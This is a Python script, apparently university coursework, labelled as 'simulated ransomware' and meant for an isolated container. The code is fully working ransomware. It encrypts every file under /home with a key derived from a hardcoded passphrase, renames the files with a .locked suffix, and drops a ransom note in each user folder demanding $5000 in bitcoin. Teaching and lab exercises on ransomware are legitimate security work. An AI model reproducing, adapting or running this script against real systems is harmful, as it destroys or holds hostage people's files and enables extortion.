#!/usr/bin/env python3
"""
encrypter.py - Simulated ransomware for UoS Cyber Security coursework.
Encrypts all files under /home/* and drops a README.md ransom note.
Run this ONLY inside the isolated target container.
"""

import os
import base64
import hashlib
from cryptography.fernet import Fernet

# ---- config ----
SECRET = "kami1234"                 # the key the victim must "buy"
TARGET_DIRS = ["/home"]             # encrypt everything under /home/*
RANSOM_NOTE = "README.md"
BTC_WALLET = "cryptoABC"
RANSOM_AMOUNT = "$5000"
CONTACT = "attacker@onionmail.com"
# ----------------


def derive_key(secret: str) -> bytes:
    """Derive a valid Fernet key from a passphrase."""
    digest = hashlib.sha256(secret.encode()).digest()
    return base64.urlsafe_b64encode(digest)


def encrypt_file(path: str, fernet: Fernet) -> None:
    with open(path, "rb") as f:
        data = f.read()
    token = fernet.encrypt(data)
    with open(path, "wb") as f:
        f.write(token)
    os.rename(path, path + ".locked")


def drop_ransom_note(folder: str) -> None:
    note = f"""# YOUR FILES HAVE BEEN ENCRYPTED

All files under `{folder}` have been encrypted with AES (Fernet).

**Amount demanded:** {RANSOM_AMOUNT}
**BTC Wallet:** `{BTC_WALLET}`
**Contact:** {CONTACT}

After payment you will receive the decryption key.
Then run:

    python3 extractor.py <KEY>

Do NOT delete the `.locked` files. Do NOT rename them.

— Your friendly neighbourhood ransomware
"""
    with open(os.path.join(folder, RANSOM_NOTE), "w") as f:
        f.write(note)


def main() -> None:
    key = derive_key(SECRET)
    fernet = Fernet(key)

    encrypted = 0
    for base in TARGET_DIRS:
        for root, _dirs, files in os.walk(base):
            for name in files:
                path = os.path.join(root, name)

                # never touch our own ransom note or already-locked files
                if name == RANSOM_NOTE or path.endswith(".locked"):
                    continue

                try:
                    encrypt_file(path, fernet)
                    print(f"[+] encrypted: {path}")
                    encrypted += 1
                except Exception as e:
                    print(f"[!] skipped {path}: {e}")

        # drop a note in every /home/<user> folder
        for user_dir in os.listdir(base):
            full = os.path.join(base, user_dir)
            if os.path.isdir(full):
                drop_ransom_note(full)

    print(f"\n[✓] Done. {encrypted} files encrypted.")
    print(f"[✓] Ransom note dropped as {RANSOM_NOTE}")


if __name__ == "__main__":
    main()
